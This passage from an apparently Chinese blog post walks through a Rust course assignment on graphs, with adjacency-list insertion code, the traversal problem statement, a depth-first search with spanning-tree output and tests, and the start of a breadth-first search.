    <span class="token keyword">fn</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> edge <span class="token keyword">in</span> input <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> in_v <span class="token operator">=</span> edge<span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> ex_v <span class="token operator">=</span> edge<span class="token number">.1</span><span class="token punctuation">;</span>
            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;插入"</span><span class="token punctuation">,</span>in_v<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>in_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">create_unorder</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> edge <span class="token keyword">in</span> input <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> in_v <span class="token operator">=</span> edge<span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> ex_v <span class="token operator">=</span> edge<span class="token number">.1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;插入"</span><span class="token punctuation">,</span>in_v<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>in_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>ex_v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>edge<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> v <span class="token keyword">in</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">&#123;</span>
            v<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">impl</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>len<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>first<span class="token punctuation">:</span><span class="token class-name">None</span><span class="token punctuation">,</span>index<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> edge<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token class-name">Edge</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>edge<span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> index <span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> edge<span class="token number">.1</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> weight <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 不涉及，默认</span>
        <span class="token comment">//处理为空</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>weight<span class="token punctuation">,</span>index<span class="token punctuation">,</span>next<span class="token punctuation">:</span><span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 处理仅有一个节点但是不访问第二个节点</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> first_node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> first_node<span class="token punctuation">.</span>index <span class="token operator">></span> index <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
                    weight<span class="token punctuation">,</span>
                    index<span class="token punctuation">,</span>
                    next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> first_node<span class="token punctuation">.</span>index <span class="token operator">==</span> index <span class="token punctuation">&#123;</span>
                <span class="token comment">// 重复索引，不处理</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">//</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current<span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> next_node<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>next <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> next_node<span class="token punctuation">.</span>index <span class="token operator">==</span> index <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 重复索引，不处理</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> next_node<span class="token punctuation">.</span>index <span class="token operator">></span> index <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 在当前位置插入</span>
                    <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
                        weight<span class="token punctuation">,</span>
                        index<span class="token punctuation">,</span>
                        next<span class="token punctuation">:</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
                    node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token comment">// 继续向后遍历</span>
                current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 到达链表末尾，在末尾插入</span>
                <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
                    weight<span class="token punctuation">,</span>
                    index<span class="token punctuation">,</span>
                    next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
                node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"顶点&#123;&#125;通向的边有："</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current<span class="token punctuation">&#123;</span>
            <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>node<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">reverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token punctuation">&#123;</span><span class="token class-name">Edge</span><span class="token punctuation">,</span> <span class="token class-name">Graph</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> edges <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        g<span class="token punctuation">.</span><span class="token function">create_unorder</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>
        g<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="图遍历的演示"><a href="#图遍历的演示" class="headerlink" title="图遍历的演示"></a>图遍历的演示</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="[问题描述]"></a>[问题描述]</h3><p>很多涉及图操作的算法都是以图的遍历操作为基础的。试写一个程序，演示无向图的遍历操作。</p>
<h3 id="基本要求"><a href="#基本要求" class="headerlink" title="[基本要求]"></a>[基本要求]</h3><p>以邻接表为存储结构，实现连通无向图的深度优先和广度优先遍历。以用户指定的结点为起点，分别输出每种遍历方式的结点访问序列和相应生成树的边集。</p>
<h3 id="测试数据"><a href="#测试数据" class="headerlink" title="[测试数据]"></a>[测试数据]</h3><p>依据软件工程的测试技术自己确定，注意测试边界数据，如单个结点。</p>
<h3 id="实现提示"><a href="#实现提示" class="headerlink" title="[实现提示]"></a>[实现提示]</h3><p>设图的结点不超过30个，每个结点用一个编号表示（如果一个图有n个结点，则它们的编号分别为1, 2, …, n）。通过输入图的全部边的方式输入一个图，每条边为一个数对，可以对边的输入顺序做出某种限制。注意，生成树的边是有向边，端点顺序不能颠倒。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先是dfs，需要额外的数据结构来记录节点被访问与结果，结果包括节点访问序列和生成树，需要处理好两种索引之间的转换</p>
<p>因为进入递归时没有调用者，所以需要caller是Option的<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">dfs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">dfs_recursive</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> visited<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> result<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> spanning_tree<span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//输出</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; "</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">(</span>result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">dfs_recursive</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> node<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> visited<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> result<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> spanning_tree<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">,</span> caller<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1-based 索引</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>caller_node<span class="token punctuation">)</span> <span class="token operator">=</span> caller <span class="token punctuation">&#123;</span>
        spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>caller_node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 遍历所有邻居</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">dfs_recursive</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_dfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> edges<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    g<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> dfs_result <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>dfs_result<span class="token punctuation">,</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> expected_edges <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>dfs_result<span class="token number">.1</span><span class="token punctuation">,</span> expected_edges<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>然后是bfs，思路类似，同样用一个hashset记录visited，一个vec记录结果，把递归换成队列<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">bfs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
